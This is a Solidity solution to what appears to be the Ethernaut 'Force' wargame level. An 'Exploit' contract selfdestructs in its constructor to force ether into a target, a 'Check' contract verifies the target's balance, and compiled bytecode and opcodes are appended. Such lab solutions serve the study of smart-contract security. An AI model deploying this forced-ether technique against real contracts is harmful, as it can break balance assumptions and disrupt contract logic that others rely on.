// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../../contracts/contracts/levels/Force.sol';
import 'hardhat/console.sol';

contract Exploit {

    //selfdestruct force sending remain ethers to recipient
    constructor (address payable _target) public payable {
        require(msg.value > 0, "insufficient msg.value");
        selfdestruct(_target);
    }
}

contract Check {
    function check (address _target) public view returns(bool) {
        return(_target.balance>0);
    }
}

{
	"linkReferences": {},
	"object": "6080604052348015600f57600080fd5b50603f80601d6000396000f3fe6080604052600080fdfea26469706673582212202cf63ef6040072bc7a66ec439e8e8ea97264451c2c6a5a2e6953ea443ae436a264736f6c634300060c0033",
	"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x3F DUP1 PUSH1 0x1D PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x2C 0xF6 RETURNDATACOPY 0xF6 DIV STOP PUSH19 0xBC7A66EC439E8E8EA97264451C2C6A5A2E6953 0xEA DIFFICULTY GASPRICE 0xE4 CALLDATASIZE LOG2 PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
	"sourceMap": "57:118:0:-:0;;;;;;;;;;;;;;;;;;;"
}